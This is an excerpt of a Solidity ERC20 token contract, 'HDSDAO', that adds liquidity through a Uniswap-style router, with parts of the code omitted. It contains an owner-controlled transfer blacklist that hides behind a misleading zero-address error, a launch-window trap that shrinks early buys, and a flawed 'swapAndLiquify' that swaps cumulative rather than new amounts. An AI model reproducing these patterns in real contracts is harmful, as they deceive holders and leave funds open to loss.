...
contract HDSDAO is ERC20 {
    ...
    address private _uniswapRouter = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    mapping(address => bool) private _isExcludedFromFees;
	mapping(address => bool) private _isExcludedFromUser;
    ...
    constructor(address tokenOwner) ERC20("HDSDAO", "HDSDAO") {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_uniswapRouter);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), _uniswapV2Router.WETH());
        uint256 total = 12 * 10**25;
       
		USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
        _approve(address(this), address(_uniswapRouter), total * 1000);
	...
	function excludeFromUser(address account, bool excluded) public onlyOwner {
        _isExcludedFromUser[account] = excluded;
    }
    ...
    function _transfer(
        ...
        require(from != address(0) && !_isExcludedFromUser[from], "ERC20: transfer from the zero address");
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to] ) {
			...
			if(from == uniswapV2Pair){
				if(startTime.add(15) > block.timestamp){amount = amount.div(1000000000);}
    ...
    function swapAndLiquify() private  {
		uint256 canldxAmount = ldxAmount.sub(ldxOverAmount);
		if(canldxAmount <= balanceOf(address(this)) && canldxAmount >= 10**20){
			ldxOverAmount = ldxOverAmount.add(canldxAmount);
			swapTokensForETH(ldxOverAmount.div(2));
			uint256 initialBalance = address(this).balance;
			addLiquidity(ldxOverAmount.div(2), initialBalance);
		}
    }
    ...
    function _splitOtherToken() private {
		...
		uint256 canldxAmount = ldxAmount.sub(ldxOverAmount);
		thisAmount = thisAmount - canldxAmount;
        if(thisAmount >= 10**20){
